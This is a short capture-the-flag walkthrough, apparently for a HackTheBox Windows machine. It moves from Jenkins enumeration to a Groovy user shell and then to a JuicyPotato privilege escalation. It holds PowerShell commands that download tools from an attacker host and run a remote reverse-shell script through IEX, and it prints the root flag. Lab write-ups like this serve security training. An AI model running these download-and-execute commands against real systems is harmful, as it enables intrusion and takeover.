@@ -1,0 +1,49 @@
+Find open ports using NMAP
+
+Its is found there is a hidden port 50000, use -P- in nmap scans for hidden ports
+
+Dir search using Gobuster or FFuF to the port 50000 yields /askjeeves directory
+
+Open 10.10.10.63:50000/askjeeves
+
+It directs to Jenkins page
+
+On the right-bottom cornet of the page, we can see current version of jenkins as 2.87 
+
+Use can groovy exploit code to get the user shell, which has less previlages
+
+
+
+Winodows less previlages file transfer 
+
+
+powershell -c  "Invoke-WebRequest -Uri http://10.10.16.90:8081/JuicyPotato.exe -outFile C:\Users\kohsuke\Desktop\JP.exe"
+
+
+Output folder with file name should be specified mandatorily 
+
+Once the JuicyPotato.exe is moved into the target
+
+Now we need to download and move powershell script in ps1 format, which can be downloaded from 
+
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+
+rename it to shell.ps1 and transfer file to target system, if it doesn't work then rename to shell.bat
+
+powershell -c  "Invoke-WebRequest -Uri http://10.10.16.90:8081/adminshell.bat -outFile C:\Users\kohsuke\Desktop\adminshell.bat"
+
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.90:8000/shell1.ps1')"
+
+Follow this blog for Previlage escalation using Executing the Juicy potato, it executres adminshell.bat (execture while file transfer and give admin shell)
+
+Also it is so tricky to find the root.txt, 
+
+In desktop it is hidden inside hm.txt to we need to use alternate commands to get the root flag
+
+Find the HIDDEN root.txt exist -->Get-item -Path C:\Users\Administrator\Desktop\hm.txt -stream *
+Read contents from root.txt --> Get-Content -Path C:\Users\Administrator\Desktop\hm.txt -Stream root.txt
+afbc5bd4b615a60648cec41c6ac92530
+
+
+
+
